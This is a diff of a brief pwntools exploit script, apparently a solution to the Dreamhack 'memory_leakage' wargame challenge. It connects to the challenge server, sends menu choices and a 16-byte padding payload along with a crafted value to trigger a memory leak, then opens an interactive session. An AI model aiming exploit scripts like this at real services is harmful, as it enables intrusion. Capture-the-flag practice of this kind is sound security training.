@@ -1,14 +1,12 @@
 from pwn import*
 
-context.log_level       = "DEBUG"
-context.arch            = "amd64"
-
 #p = process("./memory_leakage")
-p = remote("host3.dreamhack.games", 14085)
+p = remote("host3.dreamhack.games", 9009)
 #gdb.attach(p,api=True)
 
-payload = b"1"
-p.sendline(payload)
+p.sendline(b"3")
+
+p.sendline(b"1")
 
 payload = b"a"*0x10
 p.sendline(payload)
@@ -16,4 +14,6 @@ p.sendline(payload)
 payload = b"1633771873"
 p.sendline(payload)
 
+p.sendline(b"2")
+p.sendline(b"a"*0x10)
 p.interactive()
